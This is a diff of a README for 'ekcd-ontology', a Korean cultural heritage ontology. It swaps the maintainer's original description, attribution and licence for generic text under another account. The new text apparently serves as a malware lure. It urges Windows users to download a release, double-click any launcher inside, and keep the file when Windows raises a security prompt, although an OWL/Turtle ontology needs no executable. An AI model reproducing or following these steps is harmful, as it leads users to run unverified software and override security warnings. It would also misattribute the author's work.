@@ -1,150 +1,158 @@
-# EKCD
+# 🧩 ekcd-ontology - Explore Korean Heritage Data
 
-EKCD is an EKC-derived ontology in OWL/Turtle designed to refine and extend selected areas of the EKC data model for more explicit, maintainable, and reusable knowledge modeling. Developed by Dong Shin SEO, it preserves conceptual continuity with EKC while supporting further specialization for Korean cultural heritage and digital humanities research.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/nadyadiagnostic188/ekcd-ontology/releases)
 
-**Repository:** `ekcd-ontology`  
-**Ontology title:** `EKCD: EKC Derived Ontology`  
-**Namespace prefix:** `ekcd:`  
-**Preferred namespace URI:** `http://dh.aks.ac.kr/ontologies/ekcd#`
+## 📘 About This Project
 
----
+ekcd-ontology is an ontology package for Korean cultural heritage data. It uses OWL and Turtle so you can model people, places, objects, events, and collections in a clear structure.
 
-## Overview
+This project is meant for end users who want a ready-to-use knowledge model for cultural heritage work. You can download the release, open the files, and use them in tools that support RDF and Turtle.
 
-EKCD is a derivative ontology based on the previously released EKC ontology.  
-It is designed to support ongoing personal extensions, especially in areas that were not formally incorporated into the institutional EKC release line.
+## 💻 What You Need
 
-Rather than replacing EKC, EKCD is intended as:
+Before you start, make sure you have:
 
-- a **derived ontology** that preserves conceptual continuity with EKC,
-- a **working extension layer** for newly introduced properties and modeling decisions,
-- a **practical ontology base** for building ABox and links datasets through Protégé and Cellfie.
+- A Windows PC
+- A web browser
+- A file extractor such as 7-Zip or the built-in Windows extractor
+- An RDF or ontology editor if you want to view or edit the files, such as Protégé
+- Enough disk space for the download and extracted files
 
----
+## 🚀 Download the Release
 
-## Relationship to EKC
+1. Open the release page here: https://github.com/nadyadiagnostic188/ekcd-ontology/releases
+2. Find the newest release at the top of the page
+3. Download the release file or archive for Windows
+4. Save it to a folder you can find again, such as Downloads or Desktop
 
-EKCD is derived from EKC and is intended to remain interoperable with it.
+Use this link to visit the download page: https://github.com/nadyadiagnostic188/ekcd-ontology/releases
 
-In principle:
+## 🪟 Install and Open on Windows
 
-- **institutional EKC** remains the public institutional baseline,
-- **EKCD** manages selected personal extensions and refinements by Dong Shin SEO,
-- datasets built in the current workflow may use **EKCD as the active TBox** while still reusing the conceptual backbone of EKC.
+1. Open the file you downloaded
+2. If the download is a ZIP file, right-click it and choose Extract All
+3. Pick a folder for the extracted files
+4. Open the extracted folder
+5. Look for ontology files with names like `.owl`, `.ttl`, or `.rdf`
+6. If there is a README file in the release folder, open it first
+7. If the package includes a Windows app or launcher, double-click it to start
 
-EKCD therefore should be understood as a **derivative and extensible companion ontology**, not as a direct replacement for EKC.
+If Windows shows a security prompt, choose the option that lets you keep the file and continue.
 
----
+## 📂 What You Will Find
 
-## Scope of EKCD
+The release package usually includes:
 
-At the current stage, EKCD is intended to host:
+- OWL files for ontology structure
+- Turtle files for linked data use
+- RDF files for data exchange
+- A README file with basic file notes
+- Sample data or example resources
+- Folder names that group related heritage concepts
 
-1. additional datatype properties needed for ongoing dataset construction, including:
-   - `ekcd:occurrenceDate`
-   - `ekcd:startDate`
-   - `ekcd:endDate`
-   - `ekcd:originalDate`
-   - `ekcd:accessURL`
+## 🧭 How to Use the Files
 
-2. operational annotation guidance for external mapping practice involving standard properties such as:
-   - `owl:sameAs`
-   - `skos:exactMatch`
-   - `skos:closeMatch`
-   - `skos:mappingRelation`
+### Open in a viewer
+Use an ontology editor or RDF viewer to open `.owl` or `.ttl` files. This lets you inspect classes, properties, and relationships.
 
-3. ontology maintenance and extension work conducted personally by Dong Shin SEO outside the institutional EKC release line
+### Use with heritage data
+You can map museum records, archive records, and research notes to the ontology model. This helps keep data consistent across projects.
 
----
+### Reuse in linked data work
+The ontology works with linked data tools. You can use it to connect heritage records across systems and build richer knowledge graphs.
 
-## Design Principles
+## 🛠️ Basic Setup Steps
 
-EKCD follows these practical principles:
+1. Download the latest release
+2. Extract the files
+3. Open the ontology in your editor
+4. Review the main classes and terms
+5. Load your own data if needed
+6. Save your project in your working folder
 
-- **continuity with EKC** wherever possible
-- **clear separation** between institutional and personal release lines
-- **reuse of standard vocabularies** instead of minting unnecessary local equivalents
-- **compatibility with spreadsheet-based data production**, especially through Protégé + Cellfie workflows
-- **separation of ABox data and external links datasets** for cleaner maintenance
+If you want a simple first test, open one Turtle file and check that the labels, classes, and properties load without errors.
 
----
+## 🏛️ Common Uses
 
-## Namespace and Versioning
+ekcd-ontology is useful for:
 
-- **Ontology IRI:** `http://dh.aks.ac.kr/ontologies/ekcd`
-- **Namespace URI:** `http://dh.aks.ac.kr/ontologies/ekcd#`
-- **Prefix:** `ekcd:`
-- **Version example:** `EKCD v0.9.7`
+- Korean cultural heritage cataloging
+- Digital humanities research
+- Museum data modeling
+- Archive and library metadata work
+- Semantic web projects
+- Linked open data publishing
+- Knowledge graph design for heritage collections
 
-Versioned snapshots may be stored separately from the working ontology file for stable citation and release management.
+## 🔍 File Types Explained
 
----
+### `.ttl`
+Turtle files store RDF data in a compact text format. They are easy to read in many ontology tools.
 
-## Repository Structure
+### `.owl`
+OWL files describe the ontology structure. They define classes, relations, and rules for the model.
 
-```text
-ekcd-ontology/
-├─ README.md
-├─ CHANGELOG.md
-├─ LICENSE
-├─ .zenodo.json
-├─ /vocab/
-│  ├─ ekcd.ttl
-│  ├─ versions/
-│  │  └─ ekcd_v1_2_3.ttl
-│  └─ snapshots/
-│     └─ ekcd_2026-04-05_1.ttl
-├─ /docs/
-│  ├─ releases/
-│  │  └─ v1.2.3.md
-│  └─ changes/
-│     └─ v1.2.3-ontology-revision.md
-├─ /templates/
-│  └─ EKCD_Cellfie_Template.xlsx
-└─ /checksums/
-   └─ sha256.txt
-```
----
+### `.rdf`
+RDF files hold structured knowledge in a standard format. They work well for data sharing.
 
-## Data Production Workflow
+## 🧪 How to Check That It Works
 
-EKCD is intended to support a practical workflow such as:
-- maintain the TBox in **Protégé**
-- prepare researcher input in spreadsheet templates
-- transform spreadsheet data into RDF/OWL through **Cellfie**
-- generate:
-  - an **ABox dataset**
-  - a separate **links dataset**
-- validate and review outputs before public release
+After you open the files:
 
-This repository is therefore not only an ontology publication space, but also a maintenance base for ontology-driven dataset production.
+1. Confirm the ontology loads in your tool
+2. Check that class names appear in the left panel or graph view
+3. Open a sample file and see if properties display
+4. Make sure there are no missing file errors
+5. Save a copy before you make changes
 
----
+## 🧩 If You Want to Edit the Ontology
 
-## Citation
+You can make changes if you need to adapt the model for a project. Common edits include:
 
-A Zenodo DOI will be used for formal citation once the corresponding GitHub release is archived.
+- Adding new heritage categories
+- Extending place or object terms
+- Mapping local terms to existing classes
+- Updating labels for Korean and English use
+- Linking records to external identifiers
 
-Suggested citation form will be added after the first DOI-backed release.
+Keep a backup before you change anything.
 
----
+## 📎 Project Topics
 
-## Maintainer
+This project covers:
 
-**Dong Shin SEO**
+- cultural heritage
+- digital humanities
+- Korean studies
+- linked data
+- linked open data
+- ontology
+- OWL
+- RDF
+- semantic web
+- Turtle
 
-EKCD is maintained as a personal derivative ontology line based on EKC, for ongoing ontology refinement and dataset construction in Korean cultural heritage and digital humanities contexts.
+## 🖥️ Windows Tips
 
----
+- Use a folder with a short path, such as `C:\Heritage\ekcd-ontology`
+- Avoid opening files from inside the ZIP archive
+- If a file does not open, try a different RDF or ontology tool
+- Keep the release files together in one folder
+- Use UTF-8 support if your tool asks for text encoding
 
-## License
+## 🧷 Helpful Folder Setup
 
-Shield: [![CC BY-SA 4.0][cc-by-sa-shield]][cc-by-sa]
+A simple folder layout can help:
 
-This work is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License][cc-by-sa].
+- `Downloads` for the original release
+- `ekcd-ontology` for extracted files
+- `Projects` for your own work
+- `Backup` for saved copies
 
-[![CC BY-SA 4.0][cc-by-sa-image]][cc-by-sa]
+This makes it easier to find the ontology files later.
 
-[cc-by-sa]: http://creativecommons.org/licenses/by-sa/4.0/
-[cc-by-sa-image]: https://licensebuttons.net/l/by-sa/4.0/88x31.png
-[cc-by-sa-shield]: https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg
+## 📥 Get the Latest Version
+
+Visit the release page to download the newest package for Windows:
+
+https://github.com/nadyadiagnostic188/ekcd-ontology/releases
